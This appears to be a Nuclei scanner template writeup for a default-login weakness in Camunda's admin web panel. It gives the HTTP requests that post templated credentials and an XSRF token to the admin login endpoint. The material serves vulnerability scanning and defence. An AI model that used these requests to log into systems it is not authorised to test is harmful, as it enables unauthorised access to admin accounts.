# Nuclei Template: Camunda - Default Login
**Template ID:** camunda-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`camunda-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Camunda login panel contains a default login vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET /camunda/app/welcome/default/ HTTP/1.1
Host: {{Hostname}}

POST /camunda/api/admin/auth/user/default/login/welcome HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Accept: application/json, text/plain, */*
X-Xsrf-Token: {{xsrf_token}}

username={{username}}&password={{password}}
```

## References
- https://github.com/camunda/camunda-docs-manual/blob/master/content/webapps/admin/user-management.md
